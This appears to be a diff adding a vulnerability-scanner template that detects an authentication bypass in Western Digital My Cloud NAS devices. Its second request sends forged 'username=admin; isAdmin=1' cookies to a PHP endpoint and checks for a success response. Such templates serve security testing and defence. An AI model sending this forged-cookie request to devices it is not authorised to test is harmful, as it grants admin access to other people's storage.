@@ -1,0 +1,35 @@
+id: western-digital-my-cloud-nas-auth-bypass
+info:
+  name: Western Digital My Cloud NAS Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+http:
+  - raw:
+      - |
+        GET /web/php/chk_vv_sharename.php?vv_sharename=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"success":false}'
+        part: body
+
+  - raw:
+      - |
+        GET /web/php/chk_vv_sharename.php?vv_sharename=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: username=admin; isAdmin=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<config><res>0</res></config>"
+        part: body
